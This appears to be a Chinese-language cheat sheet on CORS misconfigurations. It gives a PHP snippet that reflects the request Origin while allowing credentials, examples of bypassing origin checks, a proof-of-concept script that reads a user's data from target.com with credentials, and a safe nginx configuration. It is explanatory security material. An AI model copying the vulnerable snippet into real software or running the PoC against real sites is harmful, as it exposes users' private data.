# CORS 跨域安全

## 常见配置错误

### Access-Control-Allow-Origin: *
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true   ← 冲突，禁止同时使用
```

### 反射 Origin
```php
header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']);
header("Access-Control-Allow-Credentials: true");
```
攻击者可构造恶意页面读取用户数据

### Origin 校验绕过
```
允许前缀: trusted.com → 绕过: trusted.com.attacker.com
允许包含: trusted.com → 绕过: nottrusted.com/?x=trusted.com
允许 null → 绕过: sandboxed iframe
```

## PoC
```html
<script>
var xhr = new XMLHttpRequest();
xhr.onload = function() { alert(xhr.responseText); };
xhr.open('GET', 'https://target.com/api/userinfo', true);
xhr.withCredentials = true;
xhr.send();
</script>
```

## 安全配置
```nginx
add_header Access-Control-Allow-Origin "https://trusted.com";
add_header Access-Control-Allow-Credentials "true";
```
